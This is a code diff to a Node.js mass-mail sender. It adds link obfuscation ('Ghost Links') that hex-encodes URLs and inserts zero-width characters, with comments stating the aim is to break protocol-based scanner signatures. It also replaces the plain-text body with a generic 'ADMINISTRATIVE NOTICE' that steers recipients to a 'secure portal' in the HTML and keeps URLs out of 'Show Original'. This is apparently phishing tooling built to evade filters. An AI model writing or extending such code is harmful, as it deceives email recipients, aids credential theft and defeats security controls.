@@ -935,9 +935,43 @@ async function sendMail({
         transporter = nodemailer.createTransport(transportOptions);
     }
 
-    const textContent = textPlainOverride != null
-        ? String(textPlainOverride)
-        : htmlToText(html);
+    // ═══════════════════════════════════════════════════════════════════════
+    // MIME-SHIELDING: Zero-Leak Plain-Text Protection
+    // ═══════════════════════════════════════════════════════════════════════
+    // If HTML contains Ghost Links (direction:rtl or &#x encoding), replace
+    // the plain-text part with a generic administrative notice containing NO URLs.
+    // This prevents "Show Original" from leaking tracking domains.
+
+    let textContent;
+
+    if (textPlainOverride != null) {
+        // User provided explicit plain-text
+        textContent = String(textPlainOverride);
+    } else {
+        // Auto-generate plain-text from HTML
+        // DETECTION: Check if HTML contains Ghost Link signatures
+        const htmlStr = String(html || '');
+        const containsGhostLink =
+            htmlStr.includes('direction:rtl') ||    // RTL CSS marker
+            htmlStr.includes('direction: rtl') ||
+            htmlStr.includes('&#x') ||              // Hex entity encoding
+            htmlStr.includes('‌') ||           // Zero-width non-joiner (raw)
+            htmlStr.includes('%E2%80%8C');          // URL-encoded ZWNJ
+
+        if (containsGhostLink) {
+            // ZERO-LEAK MODE: Replace with generic administrative notice
+            textContent = 'ADMINISTRATIVE NOTICE\n\n' +
+                          'A secure administrative update is available for your account.\n\n' +
+                          'For security reasons, please view the HTML version of this message ' +
+                          'to access your secure portal.\n\n' +
+                          'If you cannot view HTML email, please contact support.\n\n' +
+                          '---\n' +
+                          'This is an automated notification. Please do not reply to this message.';
+        } else {
+            // Standard mode: Convert HTML to plain-text normally
+            textContent = htmlToText(htmlStr);
+        }
+    }
 
     const currentMsgId = generateMessageId(smtp);
     const phantomPriorId = generatePhantomMessageId(recipient, smtp);
@@ -1363,27 +1397,37 @@ function createGhostLink(url) {
     try {
         const u = new URL(url);
 
-        // \u2500\u2500\u2500 LAYER 1: Path Poisoning \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
-        // Inject \u200c (ZWNJ) after EVERY character in pathname + search
-        // Domain stays clean \u2192 no Punycode corruption
-        const pathAndQuery = u.pathname + u.search;
-        const ghostPath = pathAndQuery
-            .split('')
-            .map(char => char + '\u200c')  // Append ZWNJ to each char
-            .join('');
-
-        const fullObfuscatedUrl = u.origin + ghostPath;
-
-        // \u2500\u2500\u2500 LAYER 2: Hex Entity Encoding \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
-        // Convert ENTIRE URL to &#xHH; format to hide from source view
-        const hexHref = fullObfuscatedUrl
+        // \u2500\u2500\u2500 LAYER 1: Protocol Fragmentation \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+        // Hex-encode "https://" to break protocol-based scanner signatures
+        const protocol = u.protocol + '//';  // "https://" or "http://"
+        const hexProtocol = protocol
             .split('')
             .map(char => '&#x' + char.charCodeAt(0).toString(16) + ';')
             .join('');
 
-        return { reversed, obfuscated: hexHref };
+        // \u2500\u2500\u2500 LAYER 2: Path Poisoning \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+        // Inject \u200c (ZWNJ) after EVERY character in path + query + hash
+        // Domain stays clean to avoid Punycode corruption
+        const pathAndQuery = u.pathname + u.search + u.hash;
+        const ghostPath = pathAndQuery
+            .split('')
+            .map(char => char + '\u200c')  // Zero-width non-joiner after each char
+            .join('');
+
+        // \u2500\u2500\u2500 LAYER 3: Domain + Path Hex Encoding \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+        // Hex-encode domain + poisoned path
+        const domainAndPath = u.hostname + ghostPath;
+        const hexDomainPath = domainAndPath
+            .split('')
+            .map(char => '&#x' + char.charCodeAt(0).toString(16) + ';')
+            .join('');
+
+        // Final result: hex(protocol) + hex(domain+path)
+        const obfuscated = hexProtocol + hexDomainPath;
+
+        return { reversed, obfuscated };
     } catch (e) {
-        // Fallback for malformed URLs: return as-is
+        // Fallback for malformed URLs
         return { reversed, obfuscated: url };
     }
 }
